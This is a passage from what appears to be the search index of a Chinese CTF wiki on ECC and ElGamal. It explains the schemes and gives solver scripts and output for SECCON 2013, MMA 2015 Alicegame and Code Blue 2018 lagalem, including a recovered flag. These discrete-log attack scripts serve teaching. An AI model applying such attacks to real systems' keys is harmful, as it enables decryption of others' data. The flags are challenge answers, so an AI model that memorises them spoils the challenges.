\u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u4ee5\u53ca\u5bf9\u5e94\u7684\u751f\u6210\u5143 base\uff0c\u8fd8\u77e5\u9053\u76f8\u5e94\u7684\u6a21\u6570\u4ee5\u53ca\u516c\u94a5\u4ee5\u53ca\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u4f46\u662f\u53ef\u4ee5\u770b\u51fa\u7684\u6211\u4eec\u7684\u6a21\u6570\u592a\u5c0f\uff0c\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u83b7\u53d6\u7ed3\u679c\u3002 \u8fd9\u91cc\u76f4\u63a5\u53c2\u8003 github\u4e0a\u7684 sage \u7a0b\u5e8f\uff0c\u66b4\u529b\u8dd1\u51fa secret key\u3002\u4e4b\u540e\u4fbf\u53ef\u4ee5\u89e3\u5bc6\u4e86\u3002 a = 1234577 b = 3213242 n = 7654319 E = EllipticCurve ( GF ( n ), [ 0 , 0 , 0 , a , b ]) base = E ([ 5234568 , 2287747 ]) pub = E ([ 2366653 , 1424308 ]) c1 = E ([ 5081741 , 6744615 ]) c2 = E ([ 610619 , 6218 ]) X = base for i in range ( 1 , n ): if X == pub : secret = i print \"[+] secret:\" , i break else : X = X + base print i m = c2 - ( c1 * secret ) print \"[+] x:\" , m [ 0 ] print \"[+] y:\" , m [ 1 ] print \"[+] x+y:\" , m [ 0 ] + m [ 1 ] \u66b4\u529b\u8dd1\u51fa\u7ed3\u679c [ + ] secret: 1584718 [ + ] x: 2171002 [ + ] y: 3549912 [ + ] x+y: 5720914","title":"2013 SECCON CTF quals Cryptanalysis"},{"location":"crypto/asymmetric/discrete-log/ecc/#_7","text":"https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/discrete-log/elgamal/","text":"ElGamal \u00b6 \u6982\u8ff0 \u00b6 ElGamal\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u662f\u57fa\u4e8e\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u4e8e1984\u5e74\u63d0\u51fa\uff0c\u4e5f\u662f\u4e00\u79cd\u53cc\u94a5\u5bc6\u7801\u4f53\u5236\uff0c\u65e2\u53ef\u4ee5\u7528\u4e8e\u52a0\u5bc6\u53c8\u53ef\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\u3002 \u5982\u679c\u6211\u4eec\u5047\u8bbep\u662f\u81f3\u5c11\u662f160\u4f4d\u7684\u5341\u8fdb\u5236\u7d20\u6570\uff0c \u5e76\u4e14p-1\u6709\u5927\u7d20\u56e0\u5b50 \uff0c\u6b64\u5916g\u662f Z_p^* Z_p^* \u7684\u751f\u6210\u5143\uff0c\u5e76\u4e14 y \\in Z_p^* y \\in Z_p^* \u3002\u90a3\u4e48\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570x( 0\\leq x \\leq p-2 0\\leq x \\leq p-2 ) \uff0c\u6ee1\u8db3 g^x \\equiv y \\bmod p g^x \\equiv y \\bmod p \u5728\u7b97\u6cd5\u4e0a\u662f\u56f0\u96be\u7684\uff0c\u8fd9\u91cc\u5c06x\u8bb0\u4e3a x=log_gy x=log_gy \u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbeA\u8981\u7ed9B\u53d1\u9001\u6d88\u606fm\u3002 \u5bc6\u94a5\u751f\u6210 \u00b6 \u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570k, 0\\leq k \\leq p-2 0\\leq k \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^k \\equiv y \\bmod p g^k \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{k}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002 \u52a0\u5bc6 \u00b6 A\u9009\u53d6\u968f\u673a\u6570 r \\in Z_{p-1} r \\in Z_{p-1} \uff0c\u5bf9\u660e\u6587\u52a0\u5bc6 E_k(m,r)=(y_1,y_2) E_k(m,r)=(y_1,y_2) \u3002\u5176\u4e2d y_1 \\equiv g^r \\bmod p y_1 \\equiv g^r \\bmod p \uff0c y_2 \\equiv my^r \\bmod p y_2 \\equiv my^r \\bmod p \u3002 \u89e3\u5bc6 \u00b6 D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002 \u96be\u70b9 \u00b6 \u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86y1,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684r\u3002 2015 MMA CTF Alicegame \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74 MMA-CTF-2015 \u4e2d\u7684 Alicegame \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u9898\u6700\u521d\u5728\u6ca1\u6709\u7ed9\u51fa\u6e90\u7801\u7684\u65f6\u5019\u5374\u662f\u6bd4\u8f83\u96be\u505a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ed9\u4e00\u4e2a m\uff0c\u7ed9\u4e00\u4e2a r \u5c31\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff0c\uff0c\u8fd9\u592a\u96be\u60f3\u3002 \u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u6e90\u7801\uff0c\u9996\u5148\u7a0b\u5e8f\u6700\u521d\u751f\u6210\u4e86 pk \u4e0e sk ( pk , sk ) = genkey ( PBITS ) \u5176\u4e2dgenkey\u51fd\u6570\u5982\u4e0b def genkey ( k ): p = getPrime ( k ) g = random . randrange ( 2 , p ) x = random . randrange ( 1 , p - 1 ) h = pow ( g , x , p ) pk = ( p , g , h ) sk = ( p , x ) return ( pk , sk ) p\u4e3ak\u4f4d\u7684\u7d20\u6570\uff0cg\u4e3a(2,p)\u8303\u56f4\u5185\u7684\u4e66\uff0cx\u5728(1,p-1)\u8303\u56f4\u5185\u3002\u5e76\u4e14\u8ba1\u7b97\u4e86 h \\equiv g^x \\bmod p h \\equiv g^x \\bmod p \u3002\u770b\u5230\u8fd9\u91cc\uff0c\u5dee\u4e0d\u591a\u5c31\u77e5\u9053\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u57df\u4e0a\u7684ElGamal\u52a0\u5bc6\u4e86\u3002\u5176\u4e2dpk\u4e3a\u516c\u94a5\uff0csk\u4e3a\u79c1\u94a5\u3002 \u63a5\u4e0b\u6765 \u7a0b\u5e8f\u8f93\u51fa\u4e8610\u6b21m\u548cr\u3002\u5e76\u4e14\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u52a0\u5bc6 def encrypt ( pk , m , r = None ): ( p , g , h ) = pk if r is None : r = random . randrange ( 1 , p - 1 ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) \u5176\u52a0\u5bc6\u65b9\u6cd5\u786e\u5b9e\u662fElGamal\u65b9\u5f0f\u7684\u52a0\u5bc6\u3002 \u6700\u540e\u7a0b\u5e8f\u5bf9flag\u8fdb\u884c\u4e86\u52a0\u5bc6\u3002\u6b64\u65f6\u7684r\u662f\u7531\u7a0b\u5e8f\u81ea\u5df1random\u7684\u3002 \u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u5728\u5341\u8f6e\u5faa\u73af\u4e2d\u53ef\u4ee5\u63a7\u5236m\u548cr\uff0c\u5e76\u4e14 c_1 \\equiv g^r \\bmod p c_1 \\equiv g^r \\bmod p c_2 \\equiv m * h^{r} \\bmod p c_2 \\equiv m * h^{r} \\bmod p \u5982\u679c\u6211\u4eec\u8bbe\u7f6e r=1\uff0cm=1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g,c_2=h c_1=g,c_2=h \u3002 r=1\uff0cm=-1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g, c_2 = p-h c_1=g, c_2 = p-h \u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u7d20\u6570p\u3002 \u6211\u4eec\u5f97\u5230\u7d20\u6570p\u6709\u4ec0\u4e48\u7528\u5462?p\u7684\u4f4d\u6570\u5728201\u4f4d\u5de6\u53f3\uff0c\u5f88\u5927\u554a\u3002 \u4f46\u662f\u554a\uff0c\u5b83\u751f\u6210\u7d20\u6570p\u4e4b\u540e\uff0c\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u554a\u3002\u6211\u4eec\u5728\u4e4b\u524d\u8bf4\u8fc7p-1\u5fc5\u987b\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u5982\u679c\u6709\u5c0f\u7684\u7d20\u56e0\u5b50\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u4e86\u3002\u5176\u653b\u51fb\u4e3b\u8981\u662f\u4f7f\u7528\u5230\u4e86baby step-giant step \u4e0e Pohlig-Hellman algorithm \u7b97\u6cd5\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u770b\uff0c\u8fd9\u91ccsage\u672c\u8eab\u81ea\u5e26\u7684\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u7684\u51fd\u6570\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u8fd9\u6837\u7684\u60c5\u51b5\u4e86\uff0c\u53c2\u89c1 discrete_log \u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u8fd9\u4e2a\u6d88\u8017\u5185\u5b58\u6bd4\u8f83\u5927\uff0c\uff0c\u4e0d\u8981\u968f\u4fbf\u62ff\u865a\u62df\u673a\u8dd1\u3002\u3002\u3002\u8fd8\u6709\u5c31\u662f\u8fd9\u5c3c\u739b\u4ea4\u4e92\u8ba9\u6211\u5934\u75bc\u554a\uff0c\uff0c\uff0c import socket from Crypto.Util.number import * from sage.all import * def get_maxfactor ( N ): f = factor ( N ) print 'factor done' return f [ - 1 ][ 0 ] maxnumber = 1 << 70 i = 0 while 1 : print 'cycle: ' , i sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( \"localhost\" , 9999 )) sock . recv ( 17 ) # get g,h sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 1024 ) ( g , h ) = eval ( data ) # get g,p sock . sendall ( \"-1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 512 ) ( g , tmp ) = eval ( data ) p = tmp + h tmp = get_maxfactor ( p - 1 ) if tmp < maxnumber : print 'may be success' # skip the for cycle sock . sendall ( 'quit \\n ' ); data = sock . recv ( 1024 ) print 'receive data: ' , data data = data [ data . index ( \":\" ) + 1 :] ( c1 , c2 ) = eval ( data ) # generate the group g = Mod ( g , p ) h = Mod ( h , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) x = discrete_log ( h , g ) print \"x = \" , x print \"Flag: \" , long_to_bytes ( long ( c2 / ( c1 ** x ))) sock . sendall ( 'quit \\n ' ) sock . recv ( 1024 ) sock . close () i += 1 \u6700\u540e\u8feb\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u4e0d\u591f\uff0c\uff0c\u6ca1\u8ba1\u7b97\u51fa\u6765\uff0c\uff0c\uff0c\u6709\u65f6\u5019\u4f1a\u5d29\uff0c\u591a\u8fd0\u884c\u51e0\u6b21\u3002\u3002 2018 Code Blue lagalem \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b from Crypto.Util.number import * from key import FLAG size = 2048 rand_state = getRandomInteger ( size // 2 ) def keygen ( size ): q = getPrime ( size ) k = 2 while True : p = q * k + 1 if isPrime ( p ): break k += 1 g = 2 while True : if pow ( g , q , p ) == 1 : break g += 1 A = getRandomInteger ( size ) % q B = getRandomInteger ( size ) % q x = getRandomInteger ( size ) % q h = pow ( g , x , p ) return ( g , h , A , B , p , q ), ( x ,) def rand ( A , B , M ): global rand_state rand_state , ret = ( A * rand_state + B ) % M , rand_state return ret def encrypt ( pubkey , m ): g , h , A , B , p , q = pubkey assert 0 < m <= p r = rand ( A , B , q ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) # pubkey, privkey = keygen(size) m = bytes_to_long ( FLAG ) c1 , c2 = encrypt ( pubkey , m ) c1_ , c2_ = encrypt ( pubkey , m ) print pubkey print ( c1 , c2 ) print ( c1_ , c2_ ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7b97\u6cd5\u5c31\u662f\u4e00\u4e2a ElGamal \u52a0\u5bc6\uff0c\u7ed9\u4e86\u540c\u4e00\u4e2a\u660e\u6587\u4e24\u7ec4\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u5176\u7279\u70b9\u5728\u4e8e\u4f7f\u7528\u7684\u968f\u673a\u6570 r \u662f\u901a\u8fc7\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\u751f\u6210\u7684\uff0c\u5219\u6211\u4eec\u77e5\u9053 c2 \\equiv m * h^{r} \\bmod p c2 \\equiv m * h^{r} \\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p \u5219 c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p \u5176\u4e2d\uff0cc2\uff0cc2_\uff0cA\uff0cB\uff0ch \u5747\u77e5\u9053\u3002\u5219\u6211\u4eec\u77e5\u9053 m^{A-1} \\equiv t \\bmod p m^{A-1} \\equiv t \\bmod p \u6211\u4eec\u5047\u8bbe\u5df2\u77e5 p \u7684\u4e00\u4e2a\u539f\u6839 g\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe g^x \\equiv t g^x \\equiv t g^y \\equiv m g^y \\equiv m \u5219 g^{y(A-1)}\\equiv g^x \\bmod p g^{y(A-1)}\\equiv g^x \\bmod p \u5219 y(A-1) \\equiv x \\bmod p-1 y(A-1) \\equiv x \\bmod p-1 \u8fdb\u800c\u6211\u4eec\u77e5\u9053 y(A-1)-k(p-1)=x y(A-1)-k(p-1)=x \u8fd9\u91cc\u6211\u4eec\u77e5\u9053 A\uff0cp\uff0cx\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u5b9a\u7406\u6c42\u5f97 s(A-1)+w(p-1)=gcd(A-1,t-1) s(A-1)+w(p-1)=gcd(A-1,t-1) \u5982\u679cgcd(A-1,t-1)=d\uff0c\u5219\u6211\u4eec\u76f4\u63a5\u8ba1\u7b97 t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p \u5982\u679c d=1\uff0c\u5219\u76f4\u63a5\u77e5\u9053 m\u3002 \u5982\u679c d \u4e0d\u4e3a1\uff0c\u5219\u5c31\u6709\u70b9\u9ebb\u70e6\u4e86\u3002\u3002 \u8fd9\u91cc\u8fd9\u9053\u9898\u76ee\u4e2d\u6070\u597d d=1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5f88\u5bb9\u6613\u8fdb\u884c\u6c42\u89e3\u3002 import gmpy2 data = open ( './transcript.txt' ) . read () . split ( ' \\n ' ) g , h , A , B , p , q = eval ( data [ 0 ]) c1 , c2 = eval ( data [ 1 ]) c1_ , c2_ = eval ( data [ 2 ]) tmp = gmpy2 . powmod ( c2 , A , p ) * gmpy2 . powmod ( h , B , p ) * gmpy2 . invert ( c2_ , p ) tmp = tmp % p print 't=' , tmp print 'A=' , A print 'p=' , p gg , x , y = gmpy2 . gcdext ( A - 1 , p - 1 ) print gg m = gmpy2 . powmod ( tmp , x , p ) print hex ( m )[ 2 :] . decode ( 'hex' ) flag \u279c 2018 -CodeBlue-lagalem git: ( master ) \u2717 python exp.py t = 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323 A = 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158 p = 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717 1 CBCTF { 183a3ce8ed93df613b002252dfc741b2 } \u53c2\u8003 \u00b6 https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf \uff0c20.4.1","title":"ElGamal"},{"location":"crypto/asymmetric/discrete-log/elgamal/#elgamal","text":"","title":"ElGamal"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_1","text":"ElGamal\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u662f\u57fa\u4e8e\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u4e8e1984\u5e74\u63d0\u51fa\uff0c\u4e5f\u662f\u4e00\u79cd\u53cc\u94a5\u5bc6\u7801\u4f53\u5236\uff0c\u65e2\u53ef\u4ee5\u7528\u4e8e\u52a0\u5bc6\u53c8\u53ef\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\u3002 \u5982\u679c\u6211\u4eec\u5047\u8bbep\u662f\u81f3\u5c11\u662f160\u4f4d\u7684\u5341\u8fdb\u5236\u7d20\u6570\uff0c \u5e76\u4e14p-1\u6709\u5927\u7d20\u56e0\u5b50 \uff0c\u6b64\u5916g\u662f Z_p^* Z_p^* \u7684\u751f\u6210\u5143\uff0c\u5e76\u4e14 y \\in Z_p^* y \\in Z_p^* \u3002\u90a3\u4e48\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570x( 0\\leq x \\leq p-2 0\\leq x \\leq p-2 ) \uff0c\u6ee1\u8db3 g^x \\equiv y \\bmod p g^x \\equiv y \\bmod p \u5728\u7b97\u6cd5\u4e0a\u662f\u56f0\u96be\u7684\uff0c\u8fd9\u91cc\u5c06x\u8bb0\u4e3a x=log_gy x=log_gy \u3002","title":"\u6982\u8ff0"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbeA\u8981\u7ed9B\u53d1\u9001\u6d88\u606fm\u3002","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_3","text":"\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570k, 0\\leq k \\leq p-2 0\\leq k \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^k \\equiv y \\bmod p g^k \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{k}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_4","text":"A\u9009\u53d6\u968f\u673a\u6570 r \\in Z_{p-1} r \\in Z_{p-1} \uff0c\u5bf9\u660e\u6587\u52a0\u5bc6 E_k(m,r)=(y_1,y_2) E_k(m,r)=(y_1,y_2) \u3002\u5176\u4e2d y_1 \\equiv g^r \\bmod p y_1 \\equiv g^r \\bmod p \uff0c y_2 \\equiv my^r \\bmod p y_2 \\equiv my^r \\bmod p \u3002","title":"\u52a0\u5bc6"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_5","text":"D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002","title":"\u89e3\u5bc6"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_6","text":"\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86y1,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684r\u3002","title":"\u96be\u70b9"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2015-mma-ctf-alicegame","text":"\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74 MMA-CTF-2015 \u4e2d\u7684 Alicegame \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u9898\u6700\u521d\u5728\u6ca1\u6709\u7ed9\u51fa\u6e90\u7801\u7684\u65f6\u5019\u5374\u662f\u6bd4\u8f83\u96be\u505a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ed9\u4e00\u4e2a m\uff0c\u7ed9\u4e00\u4e2a r \u5c31\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff0c\uff0c\u8fd9\u592a\u96be\u60f3\u3002 \u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u6e90\u7801\uff0c\u9996\u5148\u7a0b\u5e8f\u6700\u521d\u751f\u6210\u4e86 pk \u4e0e sk ( pk , sk ) = genkey ( PBITS ) \u5176\u4e2dgenkey\u51fd\u6570\u5982\u4e0b def genkey ( k ): p = getPrime ( k ) g = random . randrange ( 2 , p ) x = random . randrange ( 1 , p - 1 ) h = pow ( g , x , p ) pk = ( p , g , h ) sk = ( p , x ) return ( pk , sk ) p\u4e3ak\u4f4d\u7684\u7d20\u6570\uff0cg\u4e3a(2,p)\u8303\u56f4\u5185\u7684\u4e66\uff0cx\u5728(1,p-1)\u8303\u56f4\u5185\u3002\u5e76\u4e14\u8ba1\u7b97\u4e86 h \\equiv g^x \\bmod p h \\equiv g^x \\bmod p \u3002\u770b\u5230\u8fd9\u91cc\uff0c\u5dee\u4e0d\u591a\u5c31\u77e5\u9053\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u57df\u4e0a\u7684ElGamal\u52a0\u5bc6\u4e86\u3002\u5176\u4e2dpk\u4e3a\u516c\u94a5\uff0csk\u4e3a\u79c1\u94a5\u3002 \u63a5\u4e0b\u6765 \u7a0b\u5e8f\u8f93\u51fa\u4e8610\u6b21m\u548cr\u3002\u5e76\u4e14\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u52a0\u5bc6 def encrypt ( pk , m , r = None ): ( p , g , h ) = pk if r is None : r = random . randrange ( 1 , p - 1 ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) \u5176\u52a0\u5bc6\u65b9\u6cd5\u786e\u5b9e\u662fElGamal\u65b9\u5f0f\u7684\u52a0\u5bc6\u3002 \u6700\u540e\u7a0b\u5e8f\u5bf9flag\u8fdb\u884c\u4e86\u52a0\u5bc6\u3002\u6b64\u65f6\u7684r\u662f\u7531\u7a0b\u5e8f\u81ea\u5df1random\u7684\u3002 \u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u5728\u5341\u8f6e\u5faa\u73af\u4e2d\u53ef\u4ee5\u63a7\u5236m\u548cr\uff0c\u5e76\u4e14 c_1 \\equiv g^r \\bmod p c_1 \\equiv g^r \\bmod p c_2 \\equiv m * h^{r} \\bmod p c_2 \\equiv m * h^{r} \\bmod p \u5982\u679c\u6211\u4eec\u8bbe\u7f6e r=1\uff0cm=1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g,c_2=h c_1=g,c_2=h \u3002 r=1\uff0cm=-1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g, c_2 = p-h c_1=g, c_2 = p-h \u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u7d20\u6570p\u3002 \u6211\u4eec\u5f97\u5230\u7d20\u6570p\u6709\u4ec0\u4e48\u7528\u5462?p\u7684\u4f4d\u6570\u5728201\u4f4d\u5de6\u53f3\uff0c\u5f88\u5927\u554a\u3002 \u4f46\u662f\u554a\uff0c\u5b83\u751f\u6210\u7d20\u6570p\u4e4b\u540e\uff0c\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u554a\u3002\u6211\u4eec\u5728\u4e4b\u524d\u8bf4\u8fc7p-1\u5fc5\u987b\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u5982\u679c\u6709\u5c0f\u7684\u7d20\u56e0\u5b50\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u4e86\u3002\u5176\u653b\u51fb\u4e3b\u8981\u662f\u4f7f\u7528\u5230\u4e86baby step-giant step \u4e0e Pohlig-Hellman algorithm \u7b97\u6cd5\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u770b\uff0c\u8fd9\u91ccsage\u672c\u8eab\u81ea\u5e26\u7684\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u7684\u51fd\u6570\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u8fd9\u6837\u7684\u60c5\u51b5\u4e86\uff0c\u53c2\u89c1 discrete_log \u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u8fd9\u4e2a\u6d88\u8017\u5185\u5b58\u6bd4\u8f83\u5927\uff0c\uff0c\u4e0d\u8981\u968f\u4fbf\u62ff\u865a\u62df\u673a\u8dd1\u3002\u3002\u3002\u8fd8\u6709\u5c31\u662f\u8fd9\u5c3c\u739b\u4ea4\u4e92\u8ba9\u6211\u5934\u75bc\u554a\uff0c\uff0c\uff0c import socket from Crypto.Util.number import * from sage.all import * def get_maxfactor ( N ): f = factor ( N ) print 'factor done' return f [ - 1 ][ 0 ] maxnumber = 1 << 70 i = 0 while 1 : print 'cycle: ' , i sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( \"localhost\" , 9999 )) sock . recv ( 17 ) # get g,h sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 1024 ) ( g , h ) = eval ( data ) # get g,p sock . sendall ( \"-1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 512 ) ( g , tmp ) = eval ( data ) p = tmp + h tmp = get_maxfactor ( p - 1 ) if tmp < maxnumber : print 'may be success' # skip the for cycle sock . sendall ( 'quit \\n ' ); data = sock . recv ( 1024 ) print 'receive data: ' , data data = data [ data . index ( \":\" ) + 1 :] ( c1 , c2 ) = eval ( data ) # generate the group g = Mod ( g , p ) h = Mod ( h , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) x = discrete_log ( h , g ) print \"x = \" , x print \"Flag: \" , long_to_bytes ( long ( c2 / ( c1 ** x ))) sock . sendall ( 'quit \\n ' ) sock . recv ( 